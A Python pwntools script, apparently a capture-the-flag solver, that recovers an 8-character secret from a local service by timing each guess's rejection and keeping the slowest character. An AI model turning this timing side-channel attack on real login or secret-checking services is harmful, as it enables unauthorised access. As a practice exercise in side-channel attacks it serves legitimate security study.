from pwn import *
from time import time
import string
#io = remote("127.0.0.1", 9999)
io = remote("0.0.0.0", 10001)
CHARSET = string.printable
pre = ""

for _ in range(8):
    print(_)
    t = 0
    now = ""
    for i in CHARSET[:]:
        io.recvuntil(b":")
        print(pre + i + "0")
        io.sendline((pre + i + "0").encode())
        
        start = time()
        # 等待 "False!"
        io.recvuntil(b"!")
        end = time()
        
        # 出现错误的时间大于上一次出现错误的时间
        # 证明当前字符才对了，正确的序列又变长了一位
        if (end - start) > t:
            now = i
            t = end - start
        print(end - start)
    print()
    print(t)
    #exit()
    pre = pre + now
    print(pre)
io.interactive()